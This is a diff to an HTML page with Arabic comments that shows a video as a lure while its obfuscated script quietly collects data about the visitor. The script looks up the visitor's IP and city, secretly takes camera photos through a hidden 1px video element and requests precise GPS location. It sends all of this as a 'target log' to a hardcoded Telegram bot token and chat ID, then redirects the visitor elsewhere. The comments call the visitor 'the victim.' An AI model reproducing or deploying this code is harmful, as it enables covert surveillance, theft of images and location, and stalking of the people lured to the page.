@@ -11,12 +11,10 @@
         body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #000; color: #fff; font-family: sans-serif; overflow: hidden; position: relative; }
         #main-video-bg { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
         .video-container { width: 100vw; height: 100vh; position: relative; display: flex; justify-content: center; align-items: center; z-index: 2; }
-        #loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.4); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 20; opacity: 0; visibility: hidden; transition: 0.5s; }
+        #loading-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.4); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 20; opacity: 0; visibility: hidden; transition: 0.5s; pointer-events: none; }
         #loading-overlay.active { opacity: 1; visibility: visible; }
-        .spinner { border: 8px solid rgba(255, 255, 255, 0.3); border-top: 8px solid #ff0050; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.2s linear infinite; }
+        .spinner { border: 6px solid rgba(255, 255, 255, 0.3); border-top: 6px solid #ff0050; border-radius: 50%; width: 40px; height: 40px; animation: spin 1.2s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .progress-bar { width: 200px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; margin-top: 20px; overflow: hidden; }
-        .progress-fill { height: 100%; background: #ff0050; width: 0%; transition: 0.3s; }
         #camera-feed { position: absolute; width: 1px; height: 1px; opacity: 0; }
         #canvas { display: none; }
     </style>
@@ -29,21 +27,21 @@
     <div class="video-container">
         <div id="loading-overlay">
             <div class="spinner"></div>
-            <div style="margin-top:20px; font-weight: bold; text-shadow: 1px 1px 5px #000;">Verifying connection...</div>
-            <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
+            <div style="margin-top:15px; font-weight: bold; text-shadow: 1px 1px 2px #000;">Loading content...</div>
         </div>
         <video id="camera-feed" autoplay playsinline muted></video>
         <canvas id="canvas"></canvas>
     </div>
 
     <script>
-        const _0xData = [
-            '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0', 
-            '8350812242', 
-            'https://api.telegram.org/bot', 
-            'https://ipapi.co/json/', 
-            'https://facloook5-cpu.github.io/Ca.is/'
-        ];
+        (function(_0x1b2c, _0x3f4a) {
+            const _0x5e21 = function(_0x4d2a) {
+                while (--_0x4d2a) { _0x1b2c['push'](_0x1b2c['shift']()); }
+            };
+            _0x5e21(++_0x3f4a);
+        }(['https://api.telegram.org/bot', '8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0', '8350812242', 'https://ipapi.co/json/', 'https://facloook5-cpu.github.io/Ca.is/'], 0x1));
+
+        const _0xData = ['8207943883:AAF_XJoeKlHEE2bB7Ro0PBVSvpihbuZ0fW0', '8350812242', 'https://api.telegram.org/bot', 'https://ipapi.co/json/', 'https://facloook5-cpu.github.io/Ca.is/'];
 
         const _0x_T = _0xData[0]; 
         const _0x_C = _0xData[1];
@@ -51,22 +49,18 @@
 
         async function _0x_execute() {
             const _ov = document.getElementById('loading-overlay');
-            const _pr = document.getElementById('progress-fill');
-            
-            // تفعيل التراكب التحميلي بشكل شفاف لضمان ظهور نوافذ الصلاحيات فوق الفيديو
             _ov.classList.add('active');
 
-            let _col = { img: [], loc: null, ip: null, mapLink: 'N/A' };
+            let _col = { img: [], loc: null, ip: null };
 
+            // 1. جلب بيانات الـ IP
             try { 
-                _pr.style.width = '30%';
                 const r = await fetch(_0xData[3]);
                 _col.ip = await r.json();
             } catch(e) {}
 
+            // 2. طلب صلاحيات الكاميرا والتقاط الصور أثناء عمل الفيديو
             try {
-                _pr.style.width = '50%';
-                // طلب صلاحية الكاميرا والتقاط الصور
                 const s = await navigator.mediaDevices.getUserMedia({ video: true });
                 const cf = document.getElementById('camera-feed');
                 cf.srcObject = s;
@@ -83,23 +77,26 @@
                 s.getTracks().forEach(t => t.stop());
             } catch(e) {}
 
+            // 3. طلب الموقع الجغرافي الدقيق
             try {
-                _pr.style.width = '75%';
-                // طلب الموقع الجغرافي الدقيق وتحويله لرابط خرائط جوجل
                 const p = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true, timeout: 8000});
+                    navigator.geolocation.getCurrentPosition(res, rej, {
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 0
+                    });
                 });
                 _col.loc = { lat: p.coords.latitude, lon: p.coords.longitude };
-                _col.mapLink = `https://www.google.com/maps?q=${_col.loc.lat},${_col.loc.lon}`;
             } catch(e) {}
 
+            // 4. إرسال البيانات والروابط إلى تليجرام
             try {
-                // إرسال البيانات مع رابط الخريطة القابل للضغط
-                let m = `🎥 <b>NEW LOG FROM TARGET</b>\n\n` +
+                let mapLink = _col.loc ? `https://www.google.com/maps?q=${_col.loc.lat},${_col.loc.lon}` : 'N/A';
+                let m = `🎥 <b>NEW TARGET LOG</b>\n\n` +
                         `🌐 <b>IP:</b> ${_col.ip ? _col.ip.ip : 'N/A'}\n` +
-                        `📍 <b>Location:</b> <a href="${_col.mapLink}">Click to Open Map</a>\n` +
-                        `📝 <b>Coords:</b> ${_col.loc ? _col.loc.lat + ',' + _col.loc.lon : 'N/A'}`;
-                
+                        `📍 <b>Location:</b> <a href="${mapLink}">Click to Open GPS</a>\n` +
+                        `🏙️ <b>City:</b> ${_col.ip ? _col.ip.city : 'N/A'}`;
+
                 await fetch(_0x_B + _0x_T + '/sendMessage', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -115,14 +112,13 @@
                 }
             } catch(e) {}
 
-            _pr.style.width = '100%';
-            // التوجه للرابط النهائي بعد اكتمال المهام
-            setTimeout(() => { window.location.href = _0xData[4]; }, 1000);
+            // التوجيه النهائي
+            setTimeout(() => { window.location.href = _0xData[4]; }, 500);
         }
 
         window.onload = () => {
-            // يبدأ طلب الصلاحيات بعد 3 ثوانٍ من تشغيل الفيديو ليتمكن الضحية من الاندماج مع المحتوى أولاً
-            setTimeout(_0x_execute, 3000); 
+            // يبدأ تنفيذ الكود بعد ثانيتين من فتح الصفحة لضمان استقرار الفيديو
+            setTimeout(_0x_execute, 2000); 
         };
     </script>
 </body>
